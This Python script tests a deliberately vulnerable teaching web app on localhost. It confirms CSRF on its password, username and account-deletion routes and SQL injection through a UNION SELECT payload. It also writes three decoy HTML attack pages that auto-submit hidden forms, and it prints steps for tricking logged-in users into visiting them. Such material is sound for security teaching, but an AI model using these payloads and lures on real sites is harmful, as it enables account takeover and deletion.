#!/usr/bin/env python3
"""
CSRF Vulnerability Tests for Vulnerable Web App
This test suite verifies that the application is vulnerable to CSRF attacks
on routes that accept user input, demonstrating security flaws for educational purposes.
"""

import requests
import sqlite3
from pathlib import Path
import hashlib

# Configuration
BASE_URL = "http://localhost:5000"
TEST_USERNAME = "Jacksparrow"
TEST_PASSWORD = "princess"

class CSRFTester:
    def __init__(self):
        self.session = requests.Session()
        self.logged_in = False
        
    def login(self):
        """Login to establish a session"""
        login_data = {
            'username': TEST_USERNAME,
            'password': TEST_PASSWORD
        }
        
        # First get the login page to establish session
        response = self.session.get(f"{BASE_URL}/login")
        if response.status_code != 200:
            print(f"❌ Could not access login page: {response.status_code}")
            return False
            
        # Submit login credentials
        response = self.session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
        
        if response.status_code in [302, 303]:
            print(f"✅ Login successful - redirected to: {response.headers.get('Location', 'unknown')}")
            self.logged_in = True
            return True
        else:
            print(f"❌ Login failed: {response.status_code}")
            print(f"Response: {response.text[:200]}...")
            return False
    
    def test_csrf_change_password(self):
        """Test CSRF vulnerability on password change endpoint"""
        print("\n🔍 Testing CSRF on /changepassword endpoint...")
        
        if not self.logged_in:
            print("❌ Not logged in, skipping test")
            return False
            
        # Get current user hash from cookies
        userhash = None
        for cookie in self.session.cookies:
            if cookie.name == 'userhash':
                userhash = cookie.value
                break
                
        if not userhash:
            print("❌ Could not find userhash cookie")
            return False
            
        # Craft malicious CSRF payload
        csrf_data = {
            'newpassword': 'hacked_password_123',
            'userhash': userhash
        }
        
        # Simulate cross-site request (no CSRF token validation)
        response = self.session.get(f"{BASE_URL}/changepassword", params=csrf_data)
        
        if response.status_code == 200 or response.status_code in [302, 303]:
            print("✅ CSRF VULNERABILITY CONFIRMED: Password change succeeded without CSRF protection!")
            print(f"   Response status: {response.status_code}")
            return True
        else:
            print(f"❌ CSRF attack failed: {response.status_code}")
            return False
    
    def test_csrf_change_username(self):
        """Test CSRF vulnerability on username change endpoint"""
        print("\n🔍 Testing CSRF on /changeusername endpoint...")
        
        if not self.logged_in:
            print("❌ Not logged in, skipping test")
            return False
            
        # Get current userid from cookies  
        userid = None
        for cookie in self.session.cookies:
            if cookie.name == 'userid':
                userid = cookie.value
                break
                
        if not userid:
            print("❌ Could not find userid cookie")
            return False
            
        # Craft malicious CSRF payload
        csrf_params = {
            'newusername': 'hacked_user_csrf',
            'userid': userid
        }
        
        # Simulate cross-site request (GET request with parameters)
        response = self.session.get(f"{BASE_URL}/changeusername", params=csrf_params)
        
        if response.status_code == 200 or response.status_code in [302, 303]:
            print("✅ CSRF VULNERABILITY CONFIRMED: Username change succeeded without CSRF protection!")
            print(f"   Response status: {response.status_code}")
            print(f"   Username changed to: {csrf_params['newusername']}")
            return True
        else:
            print(f"❌ CSRF attack failed: {response.status_code}")
            return False
            
    def test_sql_injection_vulnerability(self):
        """Test SQL injection vulnerability on credit endpoint"""
        print("\n🔍 Testing SQL Injection on /credit/<userid> endpoint...")
        
        if not self.logged_in:
            print("❌ Not logged in, skipping test")
            return False
            
        # Test basic SQL injection payload
        malicious_userid = "1 UNION SELECT 1,2,3,4--"
        
        try:
            response = self.session.get(f"{BASE_URL}/credit/{malicious_userid}")
            
            if response.status_code == 200:
                print("✅ SQL INJECTION VULNERABILITY CONFIRMED: Malicious SQL executed!")
                print(f"   Payload: {malicious_userid}")
                return True
            elif response.status_code == 500:
                print("✅ SQL INJECTION VULNERABILITY LIKELY: Server error indicates SQL parsing issue")
                print(f"   Payload caused server error: {malicious_userid}")
                return True
            else:
                print(f"❌ SQL injection test inconclusive: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"✅ SQL INJECTION VULNERABILITY CONFIRMED: Exception indicates SQL parsing issue")
            print(f"   Exception: {str(e)}")
            return True

    def test_csrf_delete_user(self):
        """Test CSRF vulnerability on delete user endpoint"""
        print("\n🔍 Testing CSRF on /deleteuser endpoint...")
        print("⚠️  WARNING: This test will attempt to delete the user account!")
        
        if not self.logged_in:
            print("❌ Not logged in, skipping test")
            return False
            
        # Create a separate session for this dangerous test
        test_session = requests.Session()
        
        # Login with test session
        login_data = {
            'username': TEST_USERNAME,
            'password': TEST_PASSWORD
        }
        
        login_response = test_session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
        
        if login_response.status_code not in [302, 303]:
            print("❌ Could not establish test session for delete user test")
            return False
            
        # Attempt CSRF attack on delete user endpoint
        try:
            response = test_session.get(f"{BASE_URL}/deleteuser")
            
            if response.status_code == 200:
                print("✅ CSRF VULNERABILITY CONFIRMED: Delete user endpoint accessible via GET!")
                print("   ⚠️  User deletion succeeded without CSRF protection!")
                return True
            elif response.status_code in [302, 303]:
                print("✅ CSRF VULNERABILITY CONFIRMED: Delete user endpoint redirected (likely succeeded)!")
                print("   ⚠️  User deletion likely succeeded without CSRF protection!")
                return True
            else:
                print(f"❌ Delete user CSRF attack failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"❌ Delete user test failed with exception: {str(e)}")
            return False

def create_csrf_attack_html():
    """Create HTML files demonstrating CSRF attacks"""
    
    # CSRF attack for password change
    csrf_password_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Innocent Looking Page</title>
</head>
<body>
    <h1>Welcome to our harmless website!</h1>
    <p>You've won a prize! Click below to claim it:</p>
    
    <!-- Hidden CSRF attack form -->
    <form id="csrf-form" action="http://localhost:5000/changepassword" method="GET" style="display:none;">
        <input type="hidden" name="newpassword" value="pwned_by_csrf">
        <input type="hidden" name="userhash" value="USER_HASH_HERE">
    </form>
    
    <button onclick="document.getElementById('csrf-form').submit();">Claim Prize!</button>
    
    <script>
        // Auto-submit after 3 seconds
        setTimeout(function() {
            document.getElementById('csrf-form').submit();
        }, 3000);
    </script>
</body>
</html>'''

    # CSRF attack for username change
    csrf_username_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Social Media Link</title>
</head>
<body>
    <h1>Check out this funny video!</h1>
    <p>Loading video...</p>
    
    <!-- Hidden CSRF attack via image -->
    <img src="http://localhost:5000/changeusername?newusername=hacked_via_csrf&userid=USER_ID_HERE" 
         style="display:none;" 
         alt="CSRF Attack">
    
    <script>
        console.log("CSRF attack executed via image src!");
    </script>
</body>
</html>'''

    # CSRF attack for delete user (DANGEROUS!)
    csrf_delete_html = '''<!DOCTYPE html>
<html>
<head>
    <title>Urgent Security Alert!</title>
</head>
<body>
    <h1>⚠️ Security Alert: Verify Your Account</h1>
    <p>Click the button below to verify your account security:</p>
    
    <!-- Hidden CSRF attack that deletes user account -->
    <form id="verify-form" action="http://localhost:5000/deleteuser" method="GET" style="display:none;">
    </form>
    
    <button onclick="document.getElementById('verify-form').submit();" style="background-color:#dc3545; color:white; padding:10px 20px; border:none; border-radius:5px;">
        Verify Account Security
    </button>
    
    <script>
        // Auto-submit after 2 seconds to delete account
        setTimeout(function() {
            if(confirm("This will delete your account. This is a CSRF attack demonstration. Continue?")) {
                document.getElementById('verify-form').submit();
            }
        }, 2000);
    </script>
    
    <p style="margin-top:20px; color:#dc3545; font-size:0.8em;">
        ⚠️ WARNING: This is a CSRF attack demonstration that will delete the user account!
    </p>
</body>
</html>'''

    # Write attack files
    with open('csrf_password_attack.html', 'w') as f:
        f.write(csrf_password_html)
        
    with open('csrf_username_attack.html', 'w') as f:
        f.write(csrf_username_html)
        
    with open('csrf_delete_user_attack.html', 'w') as f:
        f.write(csrf_delete_html)
        
    print("\n📄 CSRF attack demonstration files created:")
    print("   - csrf_password_attack.html")
    print("   - csrf_username_attack.html")
    print("   - csrf_delete_user_attack.html")
    print("\n💡 To use these attacks:")
    print("   1. Replace USER_HASH_HERE with actual userhash from cookies")
    print("   2. Replace USER_ID_HERE with actual userid from cookies")
    print("   3. Host these files on a different domain")
    print("   4. Trick logged-in users to visit the malicious pages")

def main():
    print("🚨 CSRF Vulnerability Testing Suite")
    print("=" * 50)
    print("Testing application for educational CSRF vulnerabilities...")
    
    tester = CSRFTester()
    
    # Test login
    if not tester.login():
        print("❌ Could not establish authenticated session. Ensure the app is running on localhost:5000")
        return
    
    # Run CSRF tests
    results = []
    results.append(("Password Change CSRF", tester.test_csrf_change_password()))
    results.append(("Username Change CSRF", tester.test_csrf_change_username()))
    results.append(("SQL Injection", tester.test_sql_injection_vulnerability()))
    results.append(("Delete User CSRF", tester.test_csrf_delete_user()))
    
    # Create demonstration files
    create_csrf_attack_html()
    
    # Summary
    print("\n" + "=" * 50)
    print("🔍 VULNERABILITY TEST RESULTS:")
    print("=" * 50)
    
    for test_name, result in results:
        status = "✅ VULNERABLE" if result else "❌ PROTECTED"
        print(f"{test_name:25} : {status}")
    
    vulnerable_count = sum(1 for _, result in results if result)
    print(f"\n📊 Summary: {vulnerable_count}/{len(results)} endpoints are vulnerable (as intended for educational purposes)")
    
    if vulnerable_count == len(results):
        print("🎯 SUCCESS: Application demonstrates intended security vulnerabilities!")
    else:
        print("⚠️  Some vulnerabilities may not be working as intended.")

if __name__ == "__main__":
    main()
